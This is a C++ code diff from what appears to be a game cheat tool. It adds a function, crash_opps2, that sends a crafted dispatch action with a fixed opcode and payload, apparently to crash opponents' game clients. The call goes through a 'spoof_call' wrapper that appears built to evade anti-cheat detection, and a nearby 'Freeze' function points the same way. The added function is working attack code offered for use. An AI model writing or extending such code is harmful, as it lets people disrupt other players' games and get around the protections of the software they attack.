@@ -189,6 +189,53 @@ void rage::crash_opps()
     }
 }
 
+// ── crash_opps2 (via dispatch_action_vfunc thunk, rcx only) ─────────
+// Identical opcode/payload to crash_opps. Only difference: the call goes
+// through dispatch_action_vfunc (reads vtable[9] from rcx at call time)
+// instead of the pre-resolved fn pointer from get_dispatch.
+void rage::crash_opps2()
+{
+    log::debug("[RAGE] crash_opps2: ENTER\r\n");
+
+    if (!dispatch_action_vfunc) {
+        log::debug("[RAGE] crash_opps2: dispatch_action_vfunc not found\r\n");
+        toast::Show(toast::Type::Error, "dispatch_action_vfunc not found");
+        return;
+    }
+
+    // Need rcx (the dispatcher object) but NOT fn — vfunc resolves vtable[9] itself
+    uintptr_t rcx = 0;
+    {
+        dispatch_fn_t unused = nullptr;
+        if (!rage::get_dispatch(rcx, unused)) {
+            log::debug("[RAGE] crash_opps2: rcx not ready\r\n");
+            toast::Show(toast::Type::Error, "Dispatch not ready");
+            return;
+        }
+    }
+
+    log::debugf("[RAGE] crash_opps2: rcx=%p vfunc=%p\r\n",
+        (void*)rcx, (void*)dispatch_action_vfunc);
+
+    uint64_t v32 = 0x75879024;
+    int v33 = 0x90;
+
+    __try {
+        hook::g_allow_attack_send = true;
+        spoof_call(reinterpret_cast<dispatch_fn_t>(dispatch_action_vfunc),
+            (uint64_t)rcx, (uint64_t*)&v32, (uint64_t*)&v32,
+            (void*)&v33, (int)1, (char)1, (unsigned char)0);
+        hook::g_allow_attack_send = false;
+        toast::Show(toast::Type::Success, "Crash2 sent");
+        log::debug("[RAGE] crash_opps2: SUCCESS\r\n");
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        hook::g_allow_attack_send = false;
+        log::debugf("[RAGE] crash_opps2: EXCEPTION 0x%08X\r\n", GetExceptionCode());
+        toast::Show(toast::Type::Error, "Crash2 failed");
+    }
+}
+
 // ── pause_op_game (Freeze 1) ────────────────────────────────────────
 void rage::pause_op_game()
 {
